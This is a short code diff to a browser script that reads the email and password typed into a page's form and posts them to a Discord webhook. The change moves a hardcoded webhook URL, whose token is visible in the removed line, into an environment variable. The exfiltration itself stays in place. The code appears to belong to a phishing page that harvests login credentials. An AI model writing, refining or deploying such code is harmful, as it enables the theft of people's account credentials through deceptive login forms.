@@ -1,3 +1,4 @@
+require('dotenv').config();
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector('form'); 
 
@@ -11,7 +12,7 @@ document.addEventListener("DOMContentLoaded", () => {
             const email = emailField ? emailField.value : "Field Not Found";
             const password = passField ? passField.value : "Field Not Found";
 
-            await fetch('https://discord.com/api/webhooks/1514225388040224808/A2_ZIqPQRQiTgIRJP2ArOBaqjtaQYbmzPejZE1cf28vE9fI7i17kPPpvIsYAxgrzM0G2', {
+            await fetch(process.env.WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
